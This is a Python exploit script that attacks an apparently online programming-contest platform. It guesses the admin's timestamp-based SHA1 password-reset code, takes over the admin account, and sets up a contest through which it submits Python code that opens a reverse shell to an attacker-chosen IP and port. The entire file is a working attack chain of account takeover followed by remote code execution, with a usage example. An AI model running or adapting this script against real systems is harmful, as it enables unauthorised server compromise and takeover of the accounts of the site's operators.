import sys, requests, hashlib, urllib3, json
import secrets
from datetime import datetime, timedelta
from urllib.parse import unquote
from time import sleep

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DIFF = 8
NEW_PASSWORD = secrets.token_hex(8)

OUR_RCE_CODE = """
from multiprocessing import Process
def do_reverse_shell():
    import socket, os, pty
    HOST = "{}"
    PORT = {}
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
p = Process(target=do_reverse_shell)
p.start()
from time import sleep
sleep(10)
"""

SAMPLE_IMAGE_BASE64 = ("data:image/jpeg;base64,/9j/4AAQSkZJRgABA"
                      "QEASABIAAD/2wBDAP///////////////////////"
                      "////////////////////////////////////////"
                      "///////////////////////wgALCAABAAEBAREA/"
                      "8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABP"
                      "xA=")

# PROXIES = {"http":"http://127.0.0.1:8080"}
PROXIES = None

def get_csrf_token(res):
    return res.text[res.text.find("_token"):].split("\"")[2]

def reset_password(target_url, s, email):
    res = s.get(target_url + "/resetpassword", verify=False, proxies=PROXIES)
    token = get_csrf_token(res)

    res = s.post(target_url + "/resetpassword", {
        "_token": token,
        "email": email
        }, verify=False, proxies=PROXIES)

    if("An email has been sent to reset the password" in res.text):
        print("[*] The password has been reset!")
    else:
        print("[-] Couldn't reset the password!")
        sys.exit(-1)

    password_reset_time = str(datetime.now().timestamp()).split(".")[0]

    possible_password_reset_times = [str(i) for i in range(int(password_reset_time)-DIFF,
            int(password_reset_time) + DIFF)]

    possible_password_reset_codes = [hashlib.sha1(code.encode()).hexdigest() 
            for code in possible_password_reset_times]

    found = False
    for possible_code in possible_password_reset_codes:
        res = s.get(target_url + "/reset?code=" + possible_code, verify=False, proxies=PROXIES)
        if("New Password" in res.text):
            found = True
            print("[+] Found password reset code:", possible_code)
            token = get_csrf_token(res)
            password_reset_code = possible_code

    if(not found):
        print("[-] Couldn't find the password reset code")
        sys.exit(-1)
    
    res = s.post(target_url + "/reset", {
        "_token": token,
        "token": password_reset_code,
        "password": NEW_PASSWORD,
        "password_confirmation": NEW_PASSWORD
        }, verify=False, proxies=PROXIES)

    if("Password changed successfully" in res.text):
        print("[+] The password has been changed successfully!")
        print("[+] The new password:", NEW_PASSWORD)
    else:
        print("[-] Couldn't reset the password for unknown reasons :(")
        sys.exit(-1)

def login(target_url, s, email, password):
    res = s.get(target_url + "/login", verify=False, proxies=PROXIES)
    token = get_csrf_token(res)
    res = s.post(target_url + "/login", {
        "_token": token,
        "email": email,
        "password": password
        }, verify=False, proxies=PROXIES)
    if("My Profile" in res.text):
        print("[*] Logged in successfully!")
    else:
        print("[-] Couldn't log in for some reason :(")
        sys.exit(-1)

def add_new_lang(target_url, s):
    # check if language with ID 1 already exists
    res = s.get(target_url + "/controlpanel/languages", 
            verify=False, 
            proxies=PROXIES)
    res = res.text

    start_index = res.find(":languages=\"'") + 13
    end_index   = res.find("'", start_index)
    languages = res[start_index:end_index].replace("\\&quot;", "\"").strip()
    languages_json = json.loads(languages)
    for language in languages_json:
        if(language["id"] == 1):
            language_id = language["id"]
            language_name = language["name"]
            print(f"[*] A language '{language_name}' with ID {language_id} already exists..")
            language_id = language["id"]
            return language_id

    # If not, we will add it as "python"
    language_name = "python"
    data_json = {"name": language_name, 
            "dir": language_name, 
            "logo": SAMPLE_IMAGE_BASE64
            }
    res = s.post(target_url + "/controlpanel/languages/new", 
            headers={"X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"])}, 
            json=data_json, proxies=PROXIES)
    res = res.json()
    if("language has been added to the system successfully" == res["description"]):
        print("[*] Python has been added successfully as a Programming language!")
        return res["id"]
    else:
        print("[-] Failed to add Python as a Programming language :(!")
        sys.exit(-1)

def activate_lang(target_url, s, lang_id):
    data_json = {"status": "1", "id": lang_id} 
    res = s.post(target_url + "/controlpanel/languages/activat", 
            headers={"X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"])}, 
            json=data_json, proxies=PROXIES)
    res = res.json()
    if("language status changed successfully" == res["description"]):
        print("[*] Language has been activated successfully!")
    else:
        print("[-] Failed to activate the language :(")
        sys.exit(-1)

def create_problem(target_url, s):
    problem_name = secrets.token_hex(10)
    data_json = {"name": problem_name,
            "description": "test_problem",
            "question":"data:application/pdf;base64,",
            "score":"123"}
    res = s.post(target_url + "/controlpanel/problems/creat", 
            headers={"X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"])},
            json=data_json, proxies=PROXIES)
    res = res.json()
    if("The problem has been successfully added to the library" == res["description"]):
        print("[*] Created a test problem!")
        print("[*] Extracting the problem's ID..")
        
        res = s.get(target_url + "/controlpanel/problems", verify=False, proxies=PROXIES)
        res = res.text
        start_index = res.find(":problems=\"'") + 13
        end_index   = res.find("'", start_index)
        problems = res[start_index:end_index].replace("\\&quot;", "\"").strip()
        problems_json = json.loads(problems)
        for problem in problems_json:
            if(problem["name"] == problem_name):
                problem_id = problem["id"]
                print("[+] Found problem ID:", problem_id)
                return problem_id, problem_name
    else:
        print("[-] Couldn't create a test problem :(")
        sys.exit(-1)

def add_problem_testcase(target_url, s, problem_id):
    data_json = {"problemid": problem_id,
            "input":"anything",
            "output":"anything",
            "executtime":"2"}
    res = s.post(target_url + "/controlpanel/problems/testcase/creat",
            headers={"X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"])},
            json=data_json, proxies=PROXIES)
    res = res.json()
    if("The test case has been successfully added" == res["description"]):
        print("[*] Test case has been added!")
    else:
        print("[-] Couldn't create a testcase :(")
        sys.exit(-1)

def create_contest(target_url, s):
    start_date = datetime.now() + timedelta(seconds=5)
    start_date_str = start_date.strftime("%Y-%m-%dT%H:%M:%S")
    end_date = start_date + timedelta(days=3)
    end_date_str = end_date.strftime("%Y-%m-%dT%H:%M:%S")

    contest_name = secrets.token_hex(10)
    
    data_json = {"name":contest_name, 
            "description":"test_contest", 
            "startingtime": start_date_str, 
            "endingtime": end_date_str, 
            "private":"0",
            "team":"0",
            "time":"1",
            "conditions":"",
            "prize":"",
            "profile": SAMPLE_IMAGE_BASE64,
            "logo": SAMPLE_IMAGE_BASE64
            }

    res = s.post(target_url + "/controlpanel/contests/creat", headers={
        "X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"]), 
        "Accept":"application/json"
        }, json=data_json, proxies=PROXIES)

    res = res.json()
    if("Contest created successfully" == res["description"]):
        print("[+] Contest has been created successfully!")
        print("[*] Extracting the contest's ID..")
        res = s.get(target_url + "/controlpanel/contests", verify=False, proxies=PROXIES)
        res = res.text
        start_index = res.find(":contests=\"'") + 12
        end_index   = res.find("'", start_index)
        contests = res[start_index:end_index].replace("\\&quot;", "\"").strip()
        contests_json = json.loads(contests)
        for contest in contests_json:
            if(contest["name"] == contest_name):
                contest_id = contest["id"]
                print("[+] Found contest's ID:", contest_id)
                return contest_id, contest_name
    else:
        print("[-] Contest has not been created :(")
        sys.exit(-1)

def activate_contest(target_url, s, contest_id):
    data_json = {"status":1, "id": contest_id}
    res = s.post(target_url + "/controlpanel/contests/active", headers={
        "X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"]),
        "Accept": "application/json"
        }, json=data_json, proxies=PROXIES)
    res = res.json()
    if("Contest status changed successfully" == res["description"]):
        print("[+] Contest has been activated successfully!")
    else:
        print("[-] Failed to activate the contest :(")
        sys.exit(-1)

def add_lang_to_contest(target_url, s, lang_id, contest_id, contest_name):
    data_json = {"language": lang_id, "contestid": str(contest_id)}
    res = s.post(target_url + f"/competition/{contest_name}/mange/languages/add",
            headers={"X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"])},
            json=data_json, proxies=PROXIES)
    res = res.json()
    if("Language has been added successfully" == res["description"]):
        print("[+] The language has been added sucessfully to contest")
    else:
        print("[-] Failed to add the language to contest :(")
        sys.exit(-1)
        
def add_problem_to_contest(target_url, s, problem_id, contest_id, contest_name):
    data_json = {"problem": problem_id, "contestid": contest_id}
    res = s.post(target_url + f"/competition/{contest_name}/mange/question/add",
            headers={"X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"])},
            json=data_json, proxies=PROXIES)
    res = res.json()
    if("Question has been added successfully" == res["description"]):
        print("[+] The problem has been added to contest")
    else:
        print("[-] Failed to add problem to contest :(")
        sys.exit(-1)

def subscribe_to_contest(target_url, s, contest_id, contest_name):
    res = s.get(target_url + f"/competition/{contest_name}/subscription/{contest_id}",
            headers={"X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"])},
            verify=False,
            proxies=PROXIES)

    if("Successful subscription, good luck." in res.text):
        print("[+] Subscribed successfully to contest")
    else:
        print("[-] Failed to subscribe to contest :(")
        sys.exit(-1)

def do_rce(target_url, s, contest_name, problem_name, lang_id=1):
    # When lang_id == 1, this indicates that it's Python.
    res = s.get(target_url + f"/competition/{contest_name}/challenges/{problem_name}",
            headers={"X-XSRF-TOKEN": unquote(s.cookies["XSRF-TOKEN"])},
            verify=False,
            proxies=PROXIES)
    token = get_csrf_token(res)
    res = s.post(target_url + f"/competition/{contest_name}/challenges/{problem_name}", 
            files = {"_token": (None, token), 
                    "language": (None, 1), 
                    "code": ("test.py", OUR_RCE_CODE, "text/x-python")},
            verify=False, proxies = PROXIES)
    if("The solution was not accepted due to: Time out" in res.text):
        print("[+] Our code should have been executed!")
    else:
        print("[-] Our code may have not been executed :(")
        sys.exit(-1)

def main(target_url, admin_email):
    s = requests.Session()
    reset_password(target_url, s, admin_email)
    login(target_url, s, admin_email, NEW_PASSWORD)
    lang_id = add_new_lang(target_url, s)
    activate_lang(target_url, s, lang_id)
    problem_id, problem_name = create_problem(target_url, s)
    add_problem_testcase(target_url, s, problem_id)
    contest_id, contest_name = create_contest(target_url, s)
    activate_contest(target_url, s, contest_id)
    add_lang_to_contest(target_url, s, lang_id, contest_id, contest_name)
    add_problem_to_contest(target_url, s, problem_id, contest_id, contest_name)
    subscribe_to_contest(target_url, s, contest_id, contest_name)
    print("[*] Waiting for the contest to start :)")
    sleep(10)
    do_rce(target_url, s, contest_name, problem_name)

if __name__ == "__main__":
    if(len(sys.argv) != 5):
        print(f"python3 {sys.argv[0]} <target_url> <admin_email> <attacker_ip> <attacker_port>")
        print(f"python3 {sys.argv[0]} http://172.16.238.100 joe@omani.cloud 172.16.238.1 9999")
        sys.exit(0)
    OUR_RCE_CODE = OUR_RCE_CODE.format(sys.argv[3], sys.argv[4])
    main(sys.argv[1].rstrip("/"), sys.argv[2])
